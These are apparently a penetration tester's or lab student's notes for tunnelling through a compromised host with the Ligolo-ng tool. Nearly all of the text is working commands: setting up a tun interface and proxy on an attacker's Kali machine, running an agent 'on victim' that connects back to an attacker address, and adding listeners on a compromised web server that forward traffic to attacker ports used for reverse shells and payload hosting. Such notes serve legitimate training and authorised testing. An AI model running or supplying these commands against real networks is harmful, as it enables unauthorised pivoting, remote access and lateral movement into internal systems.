agent.se
proxy on kali
agent on victim
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.5.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:9001

./agent -connect 10.10.14.213:9001 -ignore-cert

session
start

Creates a listener on the machine where we're running the agent at port 1234  
 and redirects the traffic to port 4444 on our machine.  
 You can use other ports, of course.  
  
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444  //on agent

 Listener on the compromised web server at port 1235 forwarding traffic   
 to port 8000.  
  
 You can use any port you like, in our example I'm using port 8000   
 as it's the default port for a python HTTP server.  
  
listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000  //on agent



